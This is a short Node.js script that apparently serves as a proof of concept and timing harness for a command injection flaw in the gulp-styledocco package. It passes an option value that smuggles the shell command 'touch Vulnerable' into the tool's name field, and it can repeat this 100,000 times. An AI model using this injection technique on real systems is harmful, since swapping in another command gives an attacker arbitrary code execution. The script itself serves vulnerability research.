
    var arguments = process.argv;
    if (arguments.length == 3) {
        type = arguments[2];
        var time1 = process.hrtime.bigint();
        for (var i = 0; i < 100000; i++){
        try{
               var root = require("gulp-styledocco");
           var gulp = require("gulp");
           var options = {
             opt: 'docs',
             name: "123\"& touch Vulnerable& \""
           }
           gulp.src("./gulp-styledocco.js").pipe(root(options));
 } catch(e){}
        }      
        var time2 = process.hrtime.bigint();
        console.log(`${type}_time: ${time2-time1}`); 
        require("fs").writeFileSync(`${type}_time`, (time2-time1).toString()); 
    } else{
       var root = require("gulp-styledocco");
   var gulp = require("gulp");
   var options = {
     opt: 'docs',
     name: "123\"& touch Vulnerable& \""
   }
   gulp.src("./gulp-styledocco.js").pipe(root(options));

    }